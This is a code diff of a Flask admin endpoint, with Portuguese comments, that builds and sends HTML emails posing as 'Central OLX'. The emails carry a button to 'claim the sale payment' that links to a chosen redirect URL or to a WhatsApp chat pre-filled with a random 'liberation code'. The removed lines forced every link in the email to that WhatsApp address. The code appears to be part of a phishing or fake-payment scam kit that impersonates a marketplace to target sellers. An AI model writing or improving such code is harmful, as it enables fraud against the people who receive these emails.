@@ -9799,35 +9799,39 @@ def api_admin_send_email():
     except ImportError:
         pass
         
-    # Se o admin escolheu um template, o html_content j foi processado no frontend
-    if template_id and TG_WH_AVAILABLE:
-        templates = tg_wh.get_email_templates()
-        tpl = next((t for t in templates if t['id'] == int(template_id)), None)
-        if tpl:
-            # Substituir urls de imagens estáticas do template
-            host_url = request.host_url
-            if host_url.endswith('/'): host_url = host_url[:-1]
-            html_content = html_content.replace('./images/', f'{host_url}/static/email_images/')
+    # Se o admin escolheu um template ou enviou variáveis dinâmicas
+    host_url = request.host_url
+    if host_url.endswith('/'): host_url = host_url[:-1]
+    
+    # Resolver URL de redirecionamento do botão
+    custom_redirect = data.get('redirect_url', '').strip() or data.get('button_url', '').strip()
+    btn_text = data.get('button_text', '').strip() or 'RESGATAR PAGAMENTO DA VENDA'
+    
+    if custom_redirect:
+        final_btn_link = custom_redirect
+    else:
+        whatsapp = data.get('whatsapp_number', '').strip()
+        if not whatsapp:
+            whatsapp = get_whatsapp_config().get("number", "")
+        if whatsapp:
+            import urllib.parse, random, string
+            auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+            zap_msg = f"Olá, Central OLX! Vim resgatar o valor da minha venda concluída. Meu código de liberação é: {auth_code}"
+            final_btn_link = f"https://wa.me/{whatsapp}?text={urllib.parse.quote(zap_msg)}"
+        else:
+            final_btn_link = host_url
 
-            # Pegar whatsapp (supreme_whatsapp) se passado, ou tenta o do admin logado
-            whatsapp = data.get('whatsapp_number', '').strip()
-            if not whatsapp:
-                whatsapp = get_whatsapp_config().get("number", "")
-
-            if whatsapp:
-                import urllib.parse
-                import random
-                import string
-                import re
-                
-                auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-                zap_msg = f"Olá, Central OLX! Vim resgatar o valor da minha venda concluída. Meu código de liberação é: {auth_code}"
-                zap_link = f"https://wa.me/{whatsapp}?text={urllib.parse.quote(zap_msg)}"
-                
-                # Troca ABSOLUTAMENTE TODOS os links (href) do email para o link do WhatsApp
-                html_content = re.sub(r'href=[\'"][^\'"]*[\'"]', f'href="{zap_link}"', html_content)
+    if html_content:
+        # Substituir tags do botão e redirecionamento
+        html_content = html_content.replace('[LINK_REDIRECIONAMENTO]', final_btn_link) \
+                                   .replace('[LINK_WHATSAPP]', final_btn_link) \
+                                   .replace('{{link_redirecionamento}}', final_btn_link) \
+                                   .replace('[TEXTO_BOTAO]', btn_text) \
+                                   .replace('{{texto_botao}}', btn_text)
         
-        html_content = html_content.replace('./images/', request.host_url + 'static/email_images/')
+        # Se for template salvo ou contiver imagens relativas
+        html_content = html_content.replace('./images/', f'{host_url}/static/email_images/')
+        html_content = html_content.replace('/static/email_images/', f'{host_url}/static/email_images/')
 
     if not html_content:
         return jsonify({"ok": False, "error": "HTML content missing"}), 400
